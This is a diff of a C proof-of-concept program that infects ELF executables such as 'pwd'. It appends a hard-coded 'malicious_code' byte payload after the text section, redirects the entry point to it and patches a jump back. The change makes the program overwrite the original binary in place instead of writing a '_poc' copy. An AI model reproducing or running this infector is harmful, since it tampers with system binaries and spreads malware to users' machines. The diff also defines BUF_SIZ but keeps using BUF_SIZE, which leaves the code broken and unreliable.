@@ -5,12 +5,12 @@
 
 int main() {
     printf("poc completed!!!\n");
-    char elf_names[4][20] = {"pwd"};//"rm", "ls", "rm"};
+    int test_files_num = 1;
+    char elf_names[4][MAX_FILENAME_LENGTH] = {"pwd"};//"rm", "ls", "rm"};
     // char elf_names[4][20] = {"pwd", "cat", "echo","touch"};//"rm", "ls", "rm"};
-    //char elf_names[2][20] = {"touch", "ls"};
     int j;
-    for (j = 0; j < 1; j++) {
-        const int	BUF_SIZE	= 15000;
+    for (j = 0; j < test_files_num; j++) {
+        const int	BUF_SIZ = MAX_FILE_LENGTH;
         u8 filebuf[BUF_SIZE];
         int fd = open(elf_names[j], O_RDWR);
         if (fd == -1)
@@ -38,49 +38,42 @@ int main() {
                             (1 * elf_hdr->e_phentsize));
 
 
-        printf("%x\n", sec_hdr->sh_size);
-        printf("%x\n", text_start);
-        printf("%x\n", text_end);
+        //printf("%x\n", sec_hdr->sh_size);
+        //printf("%x\n", text_start);
+       // printf("%x\n", text_end);
 
-        //u8 malicious_code[18] = {};
-
-        int size = 21;
-        printf("%x\n", pram_hdr->p_paddr);
-        printf("%x\n", pram_hdr->p_filesz);
-        pram_hdr->p_filesz += size;
+        int add_instruction_size = 21;
+        //printf("%x\n", pram_hdr->p_paddr);
+       // printf("%x\n", pram_hdr->p_filesz);
+        pram_hdr->p_filesz += add_instruction_size;
         //printf("%x\n", pram_hdr->p_paddr);
         u8 malicious_code[] = { 0x50, 0xb4, 0x0c, 0xb0, 0x21, 0x65, 0x66,
                                 0xa3, 0x0d, 0x0c, 0x00, 0x00, 0x58, 0x90, 0x90, 0x90,
                                 0xE9 ,0xBF ,0xF7,0xFF ,0xFF};
                         
-
-            //u8 malicious_code[18] = { 
-                                // 0xE9 ,0xBF ,0xF7,0xFF ,0xFF};                       
+             
         int original_entry = elf_hdr->e_entry;
         //printf("origin:%x\n", original_entry);
         int i;
-        int offset = (text_end + 1 + size-original_entry + 4);
-        printf("%x\n", offset);
+        int offset = (text_end + 1 + add_instruction_size-original_entry + 4);
+       //printf("%x\n", offset);
 
-        for ( i = size-4; i < size; i++) {
-            malicious_code[i] = offset >> 8*(i-17);
+        for ( i = add_instruction_size - 4; i < add_instruction_size; i++) {
+            malicious_code[i] = offset >> 8 * (i - (add_instruction_size - 4));
             malicious_code[i] = ~malicious_code[i];
         }
 
         //printf("textend:%x\n", text_end);
 
-        for (i = 0; i < size; i++) {
+        for (i = 0; i < add_instruction_size; i++) {
             filebuf[text_end + 1 + i] = malicious_code[i];
         }
 
-
-
-        sec_hdr->sh_size += size;
-
+        sec_hdr->sh_size += add_instruction_size;
         elf_hdr->e_entry = text_end + 1;
         // printf("%x\n", elf_hdr->e_entry);
 
-        strcat(elf_names[j], "_poc");
+        //strcat(elf_names[j], "_poc");
         int fd2;
         fd2 = open(elf_names[j], O_CREAT | O_RDWR);
         if (fd2 == -1)
